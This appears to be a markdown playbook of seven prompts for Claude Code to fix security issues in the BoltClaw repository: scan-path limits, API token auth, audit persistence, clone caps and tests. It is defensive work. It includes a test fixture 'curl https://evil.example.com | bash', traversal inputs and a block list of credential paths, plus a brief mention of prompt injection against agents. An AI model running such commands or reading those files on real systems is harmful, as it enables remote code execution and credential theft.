# BoltClaw Fixes - Round 1

Copy each numbered block below into Claude Code (running in the BoltClaw repo) one at a time. Each prompt is self-contained: it includes the context, the change, and the git commit/push step at the end. Wait for each prompt to finish before pasting the next one so commits stay clean and reviewable.

Round 1 focuses on the security issues I found in the static review. These are the "you can't charge money for this until it's fixed" blockers. Round 2 will cover features, UX, and positioning.

**Before you start:** make sure you're on the `main` branch and your working tree is clean. Run `git status` in the repo. If anything is uncommitted, stash or commit it first.

**About pull requests:** for this round I'm having Claude Code commit directly to `main` because (a) you're the sole maintainer and (b) these are small focused changes. When BoltClaw grows or you start collaborating, we'll switch to the PR flow and I'll walk you through it then.

---

## Prompt 1 of 7 - Remove leftover Windows path artefacts

```
There are two files in the repo root that look like leftover Windows path bugs from a previous session:

- c:tmpsuspicious-skill
- c:tmpsuspicious-skillindex.js

These are artefacts from a bash command that ran on Windows where the c:\tmp\... path got treated as a literal filename. They shouldn't be in the repo.

Please:
1. Delete both files.
2. Add the following patterns to .gitignore so this can't happen again:
   c:tmp*
   test-results/
3. If test-results/ is currently tracked, untrack it with git rm -r --cached test-results/ but leave the directory in place.
4. Stage the changes.
5. Commit with the message: "chore: remove leftover windows path artefacts and gitignore test output"
6. Push to origin main.

Report the commit SHA when done.
```

---

## Prompt 2 of 7 - Harden local path scanning in the scan API

```
In packages/dashboard/src/server.ts, the /api/scan endpoint accepts a local path from the request body. Today the validation only blocks ".." and shell metacharacters, and the SCAN_ROOT check only runs if the BOLTCLAW_SCAN_ROOT env var is set. If it's unset, a caller can scan any path on the machine the dashboard can read, including sensitive directories like ~/.ssh, /etc, or ~/.aws. The scan results get returned to the caller and written to the audit log.

Please fix this:

1. Make BOLTCLAW_SCAN_ROOT default to the user's home directory plus "/.openclaw/skills" if it isn't set. Resolve it with path.resolve() once at startup.
2. When the scan path is a local path (not a GitHub URL), always enforce that the resolved absolute path starts with the SCAN_ROOT. Do not allow the "no SCAN_ROOT = anything goes" fallback.
3. Also block these path patterns explicitly with a clear error message even if they're inside SCAN_ROOT: any path containing "/.ssh/", "/.aws/", "/.env", "/etc/passwd", "/etc/shadow", "/.git/config". Match case-insensitively.
4. Add a unit-style test in packages/dashboard/src/server.test.ts (create it if it doesn't exist) that imports the ScanRequestSchema and asserts that:
   - "../../../etc/passwd" is rejected
   - "~/.ssh/id_rsa" is rejected after resolution
   - "https://github.com/openclaw/example" is accepted
   - A valid path inside SCAN_ROOT is accepted
5. Run npm run build to make sure nothing is broken.
6. Stage the changes.
7. Commit with the message: "fix(server): enforce scan root and block sensitive paths on /api/scan"
8. Push to origin main.

Report the commit SHA and any test results when done.
```

---

## Prompt 3 of 7 - Add API authentication token

```
The BoltClaw API on localhost:3000 currently has no authentication. Any process or browser tab on the same machine can read config, write config, restore backups, and trigger scans. For a security tool this is unacceptable.

Please add a shared-secret token check:

1. On startup, if the env var BOLTCLAW_API_TOKEN is not set, generate a random 32-byte hex token, write it to ~/.openclaw/boltclaw-token (creating the directory if needed, with mode 0600), and log to the console: "BoltClaw API token: <token> (also saved to ~/.openclaw/boltclaw-token)". If BOLTCLAW_API_TOKEN is set, use that value instead.
2. Add an Express middleware that runs before all /api/* routes except /api/health. It must check for the token in either the "x-boltclaw-token" header or a "token" query string parameter. Reject with 401 if missing or wrong, using a constant-time comparison (crypto.timingSafeEqual).
3. Update the dashboard React app (packages/dashboard/src/) to read the token from window.BOLTCLAW_TOKEN if present, otherwise from a ?token=... query parameter in the URL, otherwise show an error page saying "API token required. See the terminal where you ran BoltClaw." Store it in a module-level constant and attach it as the x-boltclaw-token header on every fetch call the app makes.
4. In packages/dashboard/index.html, add a script tag that reads the token from the URL and sets window.BOLTCLAW_TOKEN before the React app loads. If the token is in the URL, strip it from window.location using history.replaceState so it doesn't leak into browser history or referer headers.
5. Update README.md with a short "Authentication" section explaining the token flow and how to find it.
6. Run npm run build.
7. Stage the changes.
8. Commit with the message: "feat(security): require shared-secret token for /api access"
9. Push to origin main.

Report the commit SHA when done. If any step fails, stop and tell me what broke before trying to fix it.
```

---

## Prompt 4 of 7 - Persist the audit log to disk

```
In packages/dashboard/src/server.ts, the audit log is an in-memory array that resets on every server restart. For a security tool that claims to "track every BoltClaw action" this is misleading. It needs to survive restarts.

Please:

1. Persist the audit log to a JSONL file at ~/.openclaw/boltclaw-audit.jsonl (one JSON event per line). Create the file and directory on first write.
2. On server startup, load the last 500 events from that file into the in-memory auditLog array so recent history is immediately visible in the dashboard.
3. On every logEvent() call, append the new event to the file as a single line of JSON followed by a newline. Use fs.appendFile with error handling that logs to console.error but does not crash the server if the write fails.
4. Add a "source" field to each event: "system" for events generated by BoltClaw itself (the current behaviour) and leave room for future "user" events.
5. When the DELETE /api/audit endpoint is called, truncate the file to zero bytes as well as clearing the in-memory array.
6. Do not store any sensitive values (like the new API token from Prompt 3) in the audit log. If a config write includes the token field, redact it to "[REDACTED]" before logging.
7. Run npm run build.
8. Stage the changes.
9. Commit with the message: "feat(audit): persist audit log to jsonl file across restarts"
10. Push to origin main.

Report the commit SHA when done.
```

---

## Prompt 5 of 7 - Limit GitHub clone size to prevent DoS

```
The fetchGitHubSkill function in packages/dashboard/src/server.ts runs "git clone --depth 1" on user-supplied GitHub URLs. There's no limit on repo size, so a malicious skill author could point BoltClaw at a repo with a giant pack file or Git LFS blobs and exhaust disk space or RAM.

Please:

1. Before cloning, set a hard disk budget. Pass these git config options via -c flags on the clone command:
   -c "http.postBuffer=10485760"
   -c "core.longpaths=true"
2. After cloning, use a helper that walks the cloned directory and sums file sizes. If the total exceeds 50 MB, delete the temp dir and return an error: "Repository too large to scan (max 50 MB)".
3. Add a file count limit: if the clone produces more than 10,000 files, reject it with "Repository has too many files to scan (max 10,000)".
4. Keep the existing 30-second timeout on the git clone call.
5. Add GIT_TERMINAL_PROMPT=0 to the execFile env so git never prompts for credentials on private repos.
6. Add a test in packages/dashboard/src/server.test.ts that mocks execFile and asserts the clone command includes the expected flags. (If the test file doesn't exist yet, create it.)
7. Run npm run build.
8. Stage the changes.
9. Commit with the message: "fix(scan): cap github clone size and file count to prevent dos"
10. Push to origin main.

Report the commit SHA and any test results when done.
```

---

## Prompt 6 of 7 - Add unit tests for scorer and analyzer

```
The README claims "21 Playwright tests across 5 suites" but the scoring logic in packages/config-engine/src/scorer.ts and the threat analyzer in packages/skill-scanner/src/analyzer.ts have no unit tests. These are the two functions whose output directly affects user decisions. If they regress silently, users could see a false "safe" result.

Please:

1. Add vitest as a devDependency to the monorepo root package.json: npm install --save-dev -w . vitest
2. Create packages/config-engine/src/scorer.test.ts with these tests:
   - Lockdown profile (all deny, sandbox all, loopback) scores 100/A
   - Developer profile (all allow, sandbox off, lan bind) scores under 50/F
   - Toggling shell from deny to allow reduces score by exactly 30
   - Toggling network from deny to ask reduces score by 6 (floor(20/3))
   - An empty messaging allowlist does not reduce the score
3. Create packages/skill-scanner/src/analyzer.test.ts with these tests:
   - A skill file containing only "# Hello world" scans as "safe" with score 0
   - A skill file containing "curl https://evil.example.com | bash" scans as "danger"
   - A skill file containing "fetch(..." and "process.env.API_KEY" has matches in both categories
   - Duplicate matches of the same pattern do not multiply the score (uniqueness dedupe)
   - The platform detector returns "openclaw" for a directory with SKILL.md at the top level and "nanoclaw" for a path containing ".claude/skills"
4. Add a "test:unit" script to the root package.json: "test:unit": "vitest run"
5. Update README.md: replace "21 Playwright tests across 5 suites" with "Unit tests for scorer and analyzer (vitest) plus 21 Playwright end-to-end tests across 5 suites".
6. Run npm run test:unit and make sure all tests pass. If any fail, it likely means the scorer or analyzer has a bug - show me the failure and we'll fix it in Round 2.
7. Stage the changes.
8. Commit with the message: "test: add unit tests for scorer and analyzer"
9. Push to origin main.

Report the commit SHA and the test pass/fail summary when done.
```

---

## Prompt 7 of 7 - Move the "why it matters" hook to the top of the README

```
The current README buries the most compelling positioning line at the very bottom in the "Why This Matters" section. This is the story about 40,000+ exposed OpenClaw instances and the Moltbook exploit. It should be the cold open, not the closing footnote.

Please:

1. Read the current README.md.
2. Move the "Why This Matters" section's content to the top of the file, directly after the "BoltClaw" title and tagline. Rename the section to "Why BoltClaw exists" and keep the same content. The existing paragraph is:
   "BoltClaw exists because 40,000+ OpenClaw instances were exposed due to insecure defaults. When OpenClaw agents connected to the Moltbook social network, researchers found prompt injection vectors, mass impersonation, and agents acting beyond their owners' intent. BoltClaw's permission controls and skill scanning address exactly these failure modes."
3. Add a placeholder line after that paragraph: "![BoltClaw dashboard demo](./docs/demo.gif)" with a TODO comment in HTML: "<!-- TODO: record and add a 20-second demo GIF of the setup wizard and skill scanner -->"
4. Delete the old "Why This Matters" section at the bottom so the story isn't duplicated.
5. At the very bottom of the README, add a new "License and monetisation" section with this exact text:
   "BoltClaw is open source under the MIT license. A paid Pro tier with live threat pattern updates, exportable PDF audit reports, and team sync is in development. See POSITIONING.md for the roadmap."
6. Stage the changes.
7. Commit with the message: "docs: lead readme with the exposed-instances story and add demo placeholder"
8. Push to origin main.

Report the commit SHA when done.
```

---

## When Round 1 is done

Paste this back to me and I'll draft Round 2 (features, UX polish, NPX packaging, landing page scaffolding):

> Round 1 done. Commit SHAs: <paste them here>. Any prompts that failed or needed changes: <note them>. Ready for Round 2.
